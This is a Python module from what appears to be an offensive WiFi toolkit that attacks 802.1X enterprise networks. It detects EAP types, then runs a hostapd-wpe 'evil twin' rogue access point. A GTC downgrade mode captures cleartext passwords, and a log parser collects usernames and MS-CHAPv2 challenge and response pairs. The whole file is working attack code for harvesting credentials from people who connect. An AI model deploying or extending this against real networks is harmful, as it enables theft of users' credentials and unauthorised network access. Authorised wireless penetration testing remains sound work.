"""802.1X Enterprise WiFi attack module — EAP detection, fake RADIUS, hostapd-wpe."""

from __future__ import annotations

import contextlib
import os
import re
import subprocess
import tempfile
import time
from dataclasses import dataclass, field

from rich.console import Console
from rich.table import Table

from ..core.config import Config
from ..core.logger import get_logger
from ..core.opsec import OpsecEngine

console = Console()
log = get_logger("enterprise")


@dataclass
class EapInfo:
    bssid: str
    essid: str = ""
    eap_types: list[str] = field(default_factory=list)
    inner_auth: list[str] = field(default_factory=list)
    cert_cn: str = ""
    cert_org: str = ""
    realm: str = ""


@dataclass
class EnterpriseResult:
    success: bool
    attack_type: str
    credentials: list[dict] = field(default_factory=list)
    capture_file: str | None = None
    message: str = ""


class EnterpriseModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec
        self._proc: subprocess.Popen | None = None
        self._tmpdir: tempfile.TemporaryDirectory | None = None
        self._log_fh = None

    def detect_eap(self, interface: str, bssid: str, duration: int = 30) -> EapInfo:
        console.print(f"[cyan]Detecting EAP types on {bssid} ({duration}s)...[/cyan]")
        self.opsec.pre_operation()
        log.info("EAP detection: %s on %s", bssid, interface)

        info = EapInfo(bssid=bssid)
        self._detect_eap_scapy(interface, bssid, duration, info)

        if not info.eap_types:
            self._detect_eap_tshark(interface, bssid, duration, info)

        self._display_eap_info(info)
        return info

    def _detect_eap_scapy(self, interface: str, bssid: str, duration: int, info: EapInfo) -> None:
        try:
            from scapy.all import EAPOL, Dot11, Dot11Beacon, Dot11Elt, sniff
        except ImportError:
            return

        EAP_TYPE_MAP = {
            1: "Identity",
            4: "MD5-Challenge",
            6: "GTC",
            13: "EAP-TLS",
            21: "EAP-TTLS",
            25: "PEAP",
            43: "EAP-FAST",
            47: "EAP-PSK",
            52: "EAP-AKA'",
        }

        seen_types: set[int] = set()

        def process_packet(pkt):
            if pkt.haslayer(Dot11Beacon) and pkt[Dot11].addr2 == bssid:
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0 and elt.info:
                        with contextlib.suppress(Exception):
                            info.essid = elt.info.decode("utf-8", errors="ignore")
                    elt = elt.payload if hasattr(elt.payload, "ID") else None

            if pkt.haslayer(EAPOL):
                raw = bytes(pkt[EAPOL])
                if len(raw) >= 5:
                    eap_code = raw[0]
                    eap_type = raw[4] if len(raw) > 4 and eap_code in (1, 2) else None
                    if eap_type and eap_type not in seen_types:
                        seen_types.add(eap_type)
                        name = EAP_TYPE_MAP.get(eap_type, f"Unknown({eap_type})")
                        info.eap_types.append(name)

                    if eap_type == 21 and len(raw) > 9:
                        inner = raw[9] if len(raw) > 9 else 0
                        inner_map = {1: "PAP", 2: "CHAP", 3: "MS-CHAP", 26: "MS-CHAPv2", 6: "GTC"}
                        inner_name = inner_map.get(inner, f"Unknown({inner})")
                        if inner_name not in info.inner_auth:
                            info.inner_auth.append(inner_name)

                    if eap_type == 13 and len(raw) > 10:
                        self._extract_cert_info(raw[5:], info)

        sniff(iface=interface, prn=process_packet, timeout=duration, store=False)

    def _extract_cert_info(self, tls_data: bytes, info: EapInfo) -> None:
        try:
            text = tls_data.decode("ascii", errors="ignore")
            cn_match = re.search(r"CN=([^\s,/]+)", text)
            if cn_match:
                info.cert_cn = cn_match.group(1)
            org_match = re.search(r"O=([^\s,/]+)", text)
            if org_match:
                info.cert_org = org_match.group(1)
        except Exception:
            pass

    def _detect_eap_tshark(self, interface: str, bssid: str, duration: int, info: EapInfo) -> None:
        pcap_file = os.path.join(tempfile.gettempdir(), f"eap_detect_{int(time.time())}.pcap")
        try:
            proc = subprocess.Popen(
                ["sudo", "tshark",
                 "-i", interface,
                 "-a", f"duration:{duration}",
                 "-f", "ether proto 0x888e",
                 "-w", pcap_file],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            proc.wait(timeout=duration + 10)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            if proc and proc.poll() is None:
                proc.kill()
            return
        finally:
            if os.path.exists(pcap_file):
                result = subprocess.run(
                    ["tshark", "-r", pcap_file,
                     "-T", "fields",
                     "-e", "eap.type"],
                    capture_output=True, text=True, timeout=30,
                )
                eap_map = {"13": "EAP-TLS", "21": "EAP-TTLS", "25": "PEAP", "6": "GTC", "4": "MD5"}
                for line in result.stdout.strip().split("\n"):
                    line = line.strip()
                    if line in eap_map and eap_map[line] not in info.eap_types:
                        info.eap_types.append(eap_map[line])

                with contextlib.suppress(OSError):
                    os.unlink(pcap_file)

    def evil_twin_wpe(
        self, interface: str, essid: str, channel: int,
        eap_type: str = "PEAP",
        duration: int = 300,
        output_dir: str = "./captures",
    ) -> EnterpriseResult:
        console.print(
            f"[cyan]Enterprise Evil Twin (hostapd-wpe): \"{essid}\" "
            f"ch{channel} [{eap_type}][/cyan]"
        )
        self.opsec.pre_operation()
        log.info("Enterprise Evil Twin: essid=%s channel=%d eap=%s", essid, channel, eap_type)

        os.makedirs(output_dir, exist_ok=True)

        tool = self._check_tool()
        if not tool:
            return EnterpriseResult(
                success=False, attack_type="evil_twin_wpe",
                message="hostapd-wpe not found — install from: "
                        "https://github.com/OpenSecurityResearch/hostapd-wpe",
            )

        self._tmpdir = tempfile.TemporaryDirectory(prefix="voidfreq_wpe_")
        tmpdir = self._tmpdir.name

        conf_path = self._generate_wpe_config(
            tmpdir, interface, essid, channel, eap_type,
        )

        log_path = os.path.join(output_dir, f"wpe_{essid}_{int(time.time())}.log")

        self._setup_interface(interface, "192.168.88.1")

        try:
            self._log_fh = open(log_path, "w")  # noqa: SIM115
            self._proc = subprocess.Popen(
                ["sudo", tool, conf_path],
                stdout=self._log_fh,
                stderr=subprocess.STDOUT,
            )
        except FileNotFoundError:
            return EnterpriseResult(
                success=False, attack_type="evil_twin_wpe",
                message=f"{tool} failed to start",
            )

        time.sleep(3)
        if self._proc.poll() is not None:
            return EnterpriseResult(
                success=False, attack_type="evil_twin_wpe",
                message="hostapd-wpe exited immediately — check config/permissions",
            )

        console.print(f"[green bold]Enterprise Evil Twin active — capturing for {duration}s[/green bold]")
        console.print(f"[dim]Credentials logged to: {log_path}[/dim]")

        start = time.time()
        credentials: list[dict] = []

        while time.time() - start < duration:
            time.sleep(5)
            new_creds = self._parse_wpe_log(log_path)
            for cred in new_creds:
                if cred not in credentials:
                    credentials.append(cred)
                    console.print(
                        f"[green bold]CREDENTIAL: {cred.get('username', '?')} "
                        f"({cred.get('type', '?')})[/green bold]"
                    )

        self.stop()

        return EnterpriseResult(
            success=len(credentials) > 0,
            attack_type="evil_twin_wpe",
            credentials=credentials,
            capture_file=log_path,
            message=f"Captured {len(credentials)} credential(s)" if credentials
            else "No credentials captured within timeout",
        )

    def gtc_downgrade(
        self, interface: str, essid: str, channel: int,
        duration: int = 300,
        output_dir: str = "./captures",
    ) -> EnterpriseResult:
        console.print(
            f"[cyan]GTC downgrade attack on \"{essid}\" — "
            f"requesting GTC instead of MS-CHAPv2[/cyan]"
        )
        log.info("GTC downgrade: essid=%s channel=%d", essid, channel)

        return self.evil_twin_wpe(
            interface, essid, channel,
            eap_type="GTC",
            duration=duration,
            output_dir=output_dir,
        )

    def stop(self) -> None:
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()
                self._proc.wait()
            self._proc = None

        if self._log_fh:
            self._log_fh.close()
            self._log_fh = None

        if self._tmpdir:
            self._tmpdir.cleanup()
            self._tmpdir = None

    def _check_tool(self) -> str | None:
        for name in ("hostapd-wpe", "hostapd-mana"):
            try:
                subprocess.run(
                    [name, "--version"],
                    capture_output=True, timeout=5,
                )
                return name
            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue
        return None

    def _generate_wpe_config(
        self, tmpdir: str, interface: str, essid: str,
        channel: int, eap_type: str,
    ) -> str:
        path = os.path.join(tmpdir, "hostapd-wpe.conf")

        eap_user_content = self._generate_eap_user_file(eap_type)
        user_path = os.path.join(tmpdir, "eap_user")
        with open(user_path, "w") as f:
            f.write(eap_user_content)

        cert_dir = "/etc/hostapd-wpe/certs"
        lines = [
            f"interface={interface}",
            f"ssid={essid}",
            f"channel={channel}",
            "driver=nl80211",
            "hw_mode=g",
            "ieee80211n=1",
            "wpa=2",
            "wpa_key_mgmt=WPA-EAP",
            "rsn_pairwise=CCMP",
            "ieee8021x=1",
            "eap_server=1",
            f"eap_user_file={user_path}",
            f"ca_cert={cert_dir}/ca.pem",
            f"server_cert={cert_dir}/server.pem",
            f"private_key={cert_dir}/server.key",
            "dh_file=/etc/hostapd-wpe/certs/dh",
            "wpe=1",
            "wpe_logfile=/dev/null",
        ]

        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")

        return path

    def _generate_eap_user_file(self, eap_type: str) -> str:
        if eap_type == "GTC":
            return '* PEAP,TTLS\n"t" GTC "t" [2]\n'
        if eap_type == "EAP-TTLS":
            return '* TTLS\n"t" MSCHAPV2 "t" [2]\n'
        return '* PEAP,TTLS\n"t" MSCHAPV2 "t" [2]\n'

    def _setup_interface(self, interface: str, gateway_ip: str) -> None:
        cmds = [
            ["sudo", "ip", "link", "set", interface, "down"],
            ["sudo", "ip", "addr", "flush", "dev", interface],
            ["sudo", "ip", "addr", "add", f"{gateway_ip}/24", "dev", interface],
            ["sudo", "ip", "link", "set", interface, "up"],
        ]
        for cmd in cmds:
            subprocess.run(cmd, capture_output=True)

    def _parse_wpe_log(self, log_path: str) -> list[dict]:
        credentials = []
        if not os.path.exists(log_path):
            return credentials

        with open(log_path, encoding="utf-8", errors="ignore") as f:
            content = f.read()

        username_pattern = re.compile(r"(?:username|identity):\s*(.+)", re.IGNORECASE)
        challenge_pattern = re.compile(r"challenge:\s*([0-9a-fA-F:]+)", re.IGNORECASE)
        response_pattern = re.compile(r"response:\s*([0-9a-fA-F:]+)", re.IGNORECASE)
        password_pattern = re.compile(r"(?:password|GTC.password):\s*(.+)", re.IGNORECASE)

        for username_match in username_pattern.finditer(content):
            cred: dict = {
                "username": username_match.group(1).strip(),
                "type": "EAP",
            }

            pos = username_match.end()
            chunk = content[pos:pos + 500]

            pw = password_pattern.search(chunk)
            if pw:
                cred["password"] = pw.group(1).strip()
                cred["type"] = "GTC-cleartext"

            ch = challenge_pattern.search(chunk)
            if ch:
                cred["challenge"] = ch.group(1).strip()
                cred["type"] = "MS-CHAPv2"

            resp = response_pattern.search(chunk)
            if resp:
                cred["response"] = resp.group(1).strip()

            credentials.append(cred)

        return credentials

    def _display_eap_info(self, info: EapInfo) -> None:
        table = Table(title=f"802.1X EAP Info: {info.bssid}")
        table.add_column("Property", style="cyan")
        table.add_column("Value")

        table.add_row("ESSID", info.essid or "[hidden]")
        table.add_row("EAP Types", ", ".join(info.eap_types) or "Not detected")
        table.add_row("Inner Auth", ", ".join(info.inner_auth) or "N/A")
        if info.cert_cn:
            table.add_row("Certificate CN", info.cert_cn)
        if info.cert_org:
            table.add_row("Certificate Org", info.cert_org)
        if info.realm:
            table.add_row("Realm", info.realm)

        console.print(table)

        if "PEAP" in info.eap_types or "EAP-TTLS" in info.eap_types:
            console.print(
                "\n[yellow bold]PEAP/TTLS detected — hostapd-wpe evil twin possible[/yellow bold]"
            )
            if "GTC" in info.eap_types or "GTC" in info.inner_auth:
                console.print(
                    "[green]GTC detected — cleartext password capture possible![/green]"
                )

    def to_dict(self, info: EapInfo) -> dict:
        return {
            "bssid": info.bssid,
            "essid": info.essid,
            "eap_types": info.eap_types,
            "inner_auth": info.inner_auth,
            "cert_cn": info.cert_cn,
            "cert_org": info.cert_org,
            "realm": info.realm,
        }
